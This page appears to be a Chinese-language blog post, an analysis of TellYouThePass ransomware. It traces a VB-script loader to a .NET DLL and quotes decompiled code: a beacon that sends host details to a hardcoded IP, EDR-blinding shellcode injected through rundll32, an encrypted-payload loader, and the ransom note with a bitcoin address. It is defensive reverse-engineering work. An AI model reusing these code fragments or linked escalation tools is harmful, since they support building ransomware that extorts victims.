@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="360传到Alien Vault再传到我手上的三手信息，已经是晚了七天了 凑合着分析吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tellyouthepass">
+<meta property="og:url" content="https://yoloyolo.top/2024/03/28/Tellyouthepass/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="360传到Alien Vault再传到我手上的三手信息，已经是晚了七天了 凑合着分析吧">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-28T10:51:47.000Z">
+<meta property="article:modified_time" content="2024-03-28T14:10:08.507Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Malware">
+<meta property="article:tag" content="Reverse">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2024/03/28/Tellyouthepass/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Tellyouthepass | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2024/03/28/Tellyouthepass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tellyouthepass
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-03-28 18:51:47 / Modified: 22:10:08" itemprop="dateCreated datePublished" datetime="2024-03-28T18:51:47+08:00">2024-03-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>360传到Alien Vault再传到我手上的三手信息，已经是晚了七天了</p>
+<p>凑合着分析吧</p>
+<a id="more"></a>
+<h1 id="ransomware"><a class="markdownIt-Anchor" href="#ransomware"></a> Ransomware</h1>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=65fceeb4c09f255b91b17f11">https://cert.360.cn/report/detail?id=65fceeb4c09f255b91b17f11</a></p>
+</blockquote>
+<p>从这篇报告中得到勒索程序下载URL<code>http://107.175.127.195/update.hta</code>，但是已经404了</p>
+<p>微步上能找到IP关联的其他样本，时间上差不多将就着看吧</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/335b96699b836ad1d6eab2f8517233294717add7e57904915786597769f90af6">https://s.threatbook.com/report/file/335b96699b836ad1d6eab2f8517233294717add7e57904915786597769f90af6</a></p>
+</blockquote>
+<p>下载下来是一个VB脚本，Base64解码完之后再反序列化，最后调用类<code>EfsPotato.Mshta</code>，基本就是.NET了</p>
+<p>Base64解码得到的是.NET二进制序列化的结果，本来想着反序列化之后能不能对想办法导出这个类或者相关信息，尝试了下感觉没什么好办法</p>
+<p>二进制序列化内容丢Winhex里面慢慢看能看到PE文件的DOS_Header，直接foremost提取文件了</p>
+<p>提取出来个dll文件，<code>879af643473cf0d569dd015d4e8de29e</code></p>
+<p>丢010editor里面看了下，在<code>.text</code>，<code>.rsrc</code>，<code>.reloc</code>三个Section之后还有一些其他的信息</p>
+<p>但是感觉有点像是foremost分离文件的时候没分离干净，但是不影响dnspy读取这个dll，所以无所谓了</p>
+<p>跟进<code>EfsPotato.Mshta</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; EfsPotato.Mshta</span><br><span class="line">&#x2F;&#x2F; Token: 0x0600032E RID: 814 RVA: 0x0000EF9E File Offset: 0x0000D19E</span><br><span class="line">public Mshta()</span><br><span class="line">&#123;</span><br><span class="line">	new U().Equals(&quot;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进类<code>U</code>的重写函数<code>Equals</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; U</span><br><span class="line">&#x2F;&#x2F; Token: 0x06000009 RID: 9 RVA: 0x00002826 File Offset: 0x00000A26</span><br><span class="line">public override bool Equals(object obj)</span><br><span class="line">&#123;</span><br><span class="line">	this.Auto();</span><br><span class="line">	return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>到函数<code>Auto</code>这里差不多就是主函数了</p>
+<p>首先会进行提权，所使用的EXP如下所示</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a></li>
+</ul>
+<p>成功拿到管理员权限之后会与一个用于记录的服务器进行通信，且后续几乎每一步都会有对应的通信</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Token: 0x06000322 RID: 802 RVA: 0x0000EB14 File Offset: 0x0000CD14</span><br><span class="line">public static void SendHttp(string ipAddr, int ipPort, string s)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		IPAddress[] hostAddresses &#x3D; Dns.GetHostAddresses(Dns.GetHostName());</span><br><span class="line">		s +&#x3D; &quot;--&quot;;</span><br><span class="line">		s &#x3D; s + Environment.MachineName + &quot;--&quot;;</span><br><span class="line">		s &#x3D; s + Environment.UserName + &quot;--&quot;;</span><br><span class="line">		s &#x3D; s + Environment.ProcessorCount + &quot;--&quot;;</span><br><span class="line">		s &#x3D; s + Environment.Version + &quot;--&quot;;</span><br><span class="line">		foreach (IPAddress ipaddress in hostAddresses)</span><br><span class="line">		&#123;</span><br><span class="line">			s &#x3D; s + ipaddress.ToString() + &quot;,&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		s &#x3D; Uri.EscapeDataString(s);</span><br><span class="line">		string s2 &#x3D; &quot;GET &#x2F;css&#x2F;css.css?v&#x3D;&quot; + s + &quot; HTTP&#x2F;1.1\r\nHost:css.baidu.com\r\n\r\n&quot;;</span><br><span class="line">		Socket socket &#x3D; new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">		IPEndPoint remoteEP &#x3D; new IPEndPoint(IPAddress.Parse(ipAddr), ipPort);</span><br><span class="line">		socket.Connect(remoteEP);</span><br><span class="line">		socket.Send(Encoding.Default.GetBytes(s2));</span><br><span class="line">		Thread.Sleep(1000);</span><br><span class="line">		socket.Close();</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(&quot;error socket &#123;0&#125;&quot;, ex.Message);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里虽然host写的是<code>css.baidu.com</code>，但是目的IP为DLL中硬编码的变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Token: 0x04000004 RID: 4</span><br><span class="line">public string ip &#x3D; &quot;107.175.127.195&quot;;</span><br><span class="line">&#x2F;&#x2F; Token: 0x04000005 RID: 5</span><br><span class="line">public int port &#x3D; 80;</span><br></pre></td></tr></table></figure>
+<p>主机与服务均在线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -I http:&#x2F;&#x2F;107.175.127.195&#x2F;css.css</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 404 Not Found</span><br><span class="line">Date: Thu, 28 Mar 2024 [DATA EXPUNGED] GMT</span><br><span class="line">Server: Apache&#x2F;2.4.37 (AlmaLinux)</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure>
+<p>且该域名不存在解析记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nslookup css.baidu.com</span><br><span class="line"></span><br><span class="line">Server:		114.114.114.114</span><br><span class="line">Address:	114.114.114.114#53</span><br><span class="line"></span><br><span class="line">** server can&#39;t find css.baidu.com: NXDOMAIN</span><br></pre></td></tr></table></figure>
+<p>后续则是用函数<code>RealBlind1</code>，和<code>RealBlind3</code>进行规避检测</p>
+<p>虽然说两者的硬编码PE程序不一样，但是目的差不多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">byte[] array &#x3D; ExecLib.Hex2String(str + str2 + str3);</span><br><span class="line">string text &#x3D; &quot;c:\\windows\\temp\\&quot; + ExecLib.GenRandomHex(8) + &quot;.bin&quot;;</span><br><span class="line">using (FileStream fileStream &#x3D; new FileStream(text, FileMode.Create))</span><br><span class="line">&#123;</span><br><span class="line">	fileStream.Write(array, 0, array.Length);</span><br><span class="line">&#125;</span><br><span class="line">byte[] asm &#x3D; Convert.FromBase64String(this.peshellcode);</span><br><span class="line">AsmLoader.loadAsmBin(&quot;C:\\Windows\\System32\\rundll32.exe &quot; + text + &quot; 3 clear&quot;, asm, Convert.ToInt32(7000));</span><br></pre></td></tr></table></figure>
+<p><code>.bin</code>文件和<code>peshellcode</code>均为硬编码的PE文件，但<code>.bin</code>在沙箱中测试的时候并不能按代码中那样直接用rundll32.exe执行，会提示&quot;丢失条目 3&quot;</p>
+<p>跟进<code>AsmLoader.loadAsmBin</code>之后大概理解了这一步的目的</p>
+<p>目的并不是为了运行这个DLL，而是用rundll32.exe创建一个进程之后再将<code>peshellcode</code>的内容的注入到这个进程中</p>
+<p><code>peshellcode</code>的md5是<code>d8cc5986811b4f9c034313d80660334c</code>，来自于一个github项目，用于大概是清除内核回调以禁用掉杀软的一些功能</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/myzxcg/RealBlindingEDR">https://github.com/myzxcg/RealBlindingEDR</a></p>
+</blockquote>
+<p><code>.bin</code>也在IDA中大概浏览了一下，里面的一些函数的功能也是跟驱动和内核回调有关，但是没继续研究了</p>
+<p>最后则是函数<code>runEncDllPe</code>了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public void runEncDllPe()</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		string text &#x3D; &quot;c:\\windows\\temp\\&quot; + ExecLib.GenRandomHex(8) + &quot;.bin&quot;;</span><br><span class="line">		string text2 &#x3D; &quot;c:\\windows\\temp\\&quot; + ExecLib.GenRandomHex(8) + &quot;.exe&quot;;</span><br><span class="line">		&quot;c:\\windows\\temp\\&quot; + ExecLib.GenRandomHex(8) + &quot;.txt&quot;;</span><br><span class="line">		byte[] data &#x3D; Convert.FromBase64String(this.encdll);</span><br><span class="line">		byte[] array &#x3D; Convert.FromBase64String(this.loaderpe);</span><br><span class="line">		string text3 &#x3D; ExecLib.GenRandomString(32);</span><br><span class="line">		string text4 &#x3D; ExecLib.GenRandomString(16);</span><br><span class="line">		byte[] bytes &#x3D; Encoding.UTF8.GetBytes(text3);</span><br><span class="line">		byte[] bytes2 &#x3D; Encoding.UTF8.GetBytes(text4);</span><br><span class="line">		byte[] array2 &#x3D; ExecLib.Encrypt(data, bytes, bytes2);</span><br><span class="line">		using (FileStream fileStream &#x3D; new FileStream(text, FileMode.Create))</span><br><span class="line">		&#123;</span><br><span class="line">			fileStream.Write(array2, 0, array2.Length);</span><br><span class="line">		&#125;</span><br><span class="line">		using (FileStream fileStream2 &#x3D; new FileStream(text2, FileMode.Create))</span><br><span class="line">		&#123;</span><br><span class="line">			fileStream2.Write(array, 0, array.Length);</span><br><span class="line">		&#125;</span><br><span class="line">		ExecLib.ExecuteCmd(string.Concat(new string[]</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;start &quot;,</span><br><span class="line">			text2,</span><br><span class="line">			&quot; &quot;,</span><br><span class="line">			text,</span><br><span class="line">			&quot; &quot;,</span><br><span class="line">			text3,</span><br><span class="line">			&quot; &quot;,</span><br><span class="line">			text4</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>loaderpe</code>的作用就是把加密后写入的<code>encdll</code>解密再调用类<code>U</code>的重写函数<code>Equals</code></p>
+<p>两者的md5分别是<code>6d448cba987a24c3ddbde760d76c5a15</code>,<code>9c1ceb62612af0c495f515d3afac8150</code></p>
+<p><code>text3</code>是key，<code>text4</code>是IV</p>
+<p><code>encdll</code>则是用于加密勒索</p>
+<p>先Kill掉一些会占用文件的进程，删除卷影备份，生成临时RSA密钥对</p>
+<p>然后就该干嘛干嘛了</p>
+<p>其他一些硬编码信息如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Token: 0x04000002 RID: 2</span><br><span class="line">public static string httpAddr &#x3D; &quot;107.175.127.195&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000003 RID: 3</span><br><span class="line">public static bool debug &#x3D; false;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000004 RID: 4</span><br><span class="line">public static bool skipJava &#x3D; true;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000005 RID: 5</span><br><span class="line">public static int httpPort &#x3D; 80;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000006 RID: 6</span><br><span class="line">private static string personPubKey &#x3D; &quot;BgIAAACkAABSU0ExAAQAAAEAAQABo5INMgvZRHU+odxc8HTZUnsValb+zVbnhjhUK0Smo6MnGNYvaQY6vN9j5viFHTfCgu0NculsfILwXtUVUn8WqEHjm0xfbsKl93uazKHzyuiiepA5ggNHgGbZ5vnpo5MKE3ykwdqYPst8ULxCZNPCdu3kK2PKC2li150Dl8e2zA&#x3D;&#x3D;&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000007 RID: 7</span><br><span class="line">private static string btcCount &#x3D; &quot;0.08&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000008 RID: 8</span><br><span class="line">private static string btcAddr &#x3D; &quot;bc1qnuxx83nd4keeegrumtnu8kup8g02yzgff6z53l&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x04000009 RID: 9</span><br><span class="line">private static string email &#x3D; &quot;service@helloworldtom.online&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x0400000A RID: 10</span><br><span class="line">private static string msgFileName &#x3D; &quot;READ_ME5.html&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x0400000B RID: 11</span><br><span class="line">private static readonly string fileExtension &#x3D; &quot;.locked&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Token: 0x0400000E RID: 14</span><br><span class="line">private static string readMeMsg &#x3D; string.Concat(new string[]</span><br><span class="line">&#123;</span><br><span class="line">	&quot;send &quot;,</span><br><span class="line">	U.btcCount,</span><br><span class="line">	&quot;btc to my address:&quot;,</span><br><span class="line">	U.btcAddr,</span><br><span class="line">	&quot;. contact email:&quot;,</span><br><span class="line">	U.email,</span><br><span class="line">	&quot;,if you can&#39;t contact my email, please contact some data recovery company(suggest taobao.com), may they can contact to me .your id: ATNPERSONID&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>截止至2024-03-28，该地址已入账比特币0.279个</p>
+<hr />
+<h1 id="botnet"><a class="markdownIt-Anchor" href="#botnet"></a> Botnet</h1>
+<p>TBC</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2024/03/28/Tellyouthepass/" title="Tellyouthepass">https://yoloyolo.top/2024/03/28/Tellyouthepass/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Malware/" rel="tag"># Malware</a>
+              <a href="/tags/Reverse/" rel="tag"># Reverse</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/17/CRTO/" rel="prev" title="CRTO">
+      <i class="fa fa-chevron-left"></i> CRTO
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ransomware"><span class="nav-number">1.</span> <span class="nav-text"> Ransomware</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#botnet"><span class="nav-number">2.</span> <span class="nav-text"> Botnet</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
